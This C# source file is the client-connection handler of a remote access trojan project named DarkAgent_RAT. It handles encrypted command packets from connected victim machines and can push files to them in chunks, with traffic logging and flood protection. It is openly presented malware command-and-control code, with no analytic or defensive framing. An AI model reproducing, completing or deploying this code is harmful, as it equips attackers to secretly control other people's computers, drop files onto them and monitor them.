using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using DarkAgent_RAT.src.Network.DataNetwork.Packets;
using DarkAgent_RAT.src.Engines;
using DarkAgent_RAT.src.Utils;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Objects;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using System.IO;
using DarkAgent_RAT.src.Network.DataNetwork;
using System.Drawing;

//credits DragonHunter

namespace DarkAgent_RAT.src.Network
{
    public class RatClients
    {
        public delegate void DisconnectHandler(RatClients client);
        private Socket _socket;
        private byte[] _buffer;
        public DisconnectHandler DisconnectHandle {get;set;}
        private FloodProtector _FloodProtector;
        public int ClientID;
        public int NetworkKey;
        public Point ScreenSize;
        public string FileServerRemoteIP;

        public SortedList<short, FileTransfer> _FileTransfer;

        public RatClients(Socket socket, int key)
        {
            _socket = socket;
            NetworkKey = key;
            _FloodProtector = new FloodProtector(2000, 1000);
            _FileTransfer = new SortedList<short, FileTransfer>();
            Read();
        }

        private void Read()
        {
            //Read first 2 bytes of the packet, this contains the size.
            _buffer = new byte[2];
            try { _socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, new AsyncCallback(ReadCallback), null); } catch {}
        }

        private void ReadCallback(IAsyncResult ar)
        {
            try
            {
                _buffer = new byte[BitConverter.ToInt16(_buffer, 0) - 2];
                if (_buffer.Length > 6500) //65kb
                {
                    Disconnect();
                    return;
                }
                else if (_buffer.Length > 0)
                {
                    _socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, ReadCallbackStatic, null);
                    return;
                }
                else
                {
                    Disconnect();
                    return;
                }
            }
            catch
            {
                Disconnect();
                return;
            }
        }

        private void ReadCallbackStatic(IAsyncResult ar)
        {
            //try
            //{
                if (_socket.EndReceive(ar) > 1)
                {
                    if (_FloodProtector.HandleFlood(_socket.RemoteEndPoint) == false)
                    {
                        Disconnect();
                        return;
                    }

                    byte[] buff = new byte[_buffer.Length];
                    Array.Copy(_buffer, buff, _buffer.Length);
                    Read(); //Lets keep reading

                    if (buff.Length > 0)
                    {
                        buff = CryptEngine.Crypt(buff, NetworkKey);
                        Type pck = ClientPacketProcessor.ProcessPacket(buff, _socket.RemoteEndPoint.ToString());
                        if (pck != null)
                        {
                            ReceiveBasePacket rbp = (ReceiveBasePacket)Activator.CreateInstance(pck, this, buff);
                            Thread pckRun = new Thread(rbp.Run);
                            pckRun.Start();

                            settings.ReceivedPackets++;
                        }
                        else
                        {
                            //unknown packet received
                            Disconnect();
                            return;
                        }
                        return;
                    }
                    else
                    {
                        //Disconnect when no length is given... maybe flood? just disconnect :P
                        Disconnect();
                        return;
                    }
                }
                else
                {
                    Disconnect();
                    return;
                }
            //}
            //catch
            //{
            //    if(!_socket.Connected)
            //        Disconnect();
            //    return;
            //}
        }

        public void SendFile(FileTransfer info, byte[] FileBytes, S_FileTransferSendBegin.SendType type)
        {
            SendPacket(new S_FileTransferSendBegin(this, info, type));
            Thread thread = new Thread(new ParameterizedThreadStart(ThreadSendFile));
            thread.Start(new object[] { info, FileBytes });
        }

        private void ThreadSendFile(object param)
        {
            FileTransfer inf = (FileTransfer)((object[])param)[0];
            byte[] FileBytes = (byte[])((object[])param)[1];
            int Index = 0;

            for (int i = 0; i < FileBytes.Length; i += 1024)
            {
                if (i + 1024 <= FileBytes.Length)
                {
                    byte[] FilePiece = new byte[1024];
                    Array.Copy(FileBytes, i, FilePiece, 0, 1024);
                    SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                }
                else
                {
                    byte[] FilePiece = new byte[FileBytes.Length - i];
                    Array.Copy(FileBytes, i, FilePiece, 0, FileBytes.Length - i);
                    SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                }
                Index++;
            }
            SendPacket(new S_FileTransferSendComplete(this, inf));
        }

        public void SendPacket(SendBasePacket packet)
        {
            lock(this)
            {
                packet.Write();
                byte[] pck = packet.ToByteArray();
                byte[] NonCryptedPacket = packet.ToByteArray();

                if(pck.Length > 60000)
                    return;

                byte PacketId = pck[0];
                pck = CryptEngine.Crypt(pck, NetworkKey);

                List<Byte> FullPacket = new List<Byte>();
                FullPacket.AddRange(BitConverter.GetBytes((short)(pck.Length + 2))); //+2 Packet Length
                FullPacket.AddRange(pck);
                Console.WriteLine("Outgoing packet: " + packet.ToString());
                try { _socket.Send(FullPacket.ToArray()); } catch { }
                settings.SendedPackets++;
                TrafficLogger.AddLog(new TrafficInfo(PacketId, "Outgoing, " + ClientPacketProcessor.GetOutgoingPacket(PacketId), packet.Length.ToString(), _socket.RemoteEndPoint.ToString().Split(':')[0], NonCryptedPacket));
            }
        }

        private void Disconnect()
        {
            ClientDisconnectEventArgs e1 = new ClientDisconnectEventArgs(_socket.RemoteEndPoint.ToString());
            ClientDisconnectEvent.OnClientDisconnect(e1);

            settings.ClientsConnected--;
            Logger.AddLog(new LogInfo("Client disconnected", _socket.RemoteEndPoint.ToString().Split(':')[0]));

            _socket.Disconnect(false);
            if (DisconnectHandle != null) DisconnectHandle(this);
            MaxConnections.Disconnect(_socket.RemoteEndPoint);
        }

        public IPEndPoint RemoteEndPoint
        {
            get { return (IPEndPoint)_socket.RemoteEndPoint; }
        }
    }
}
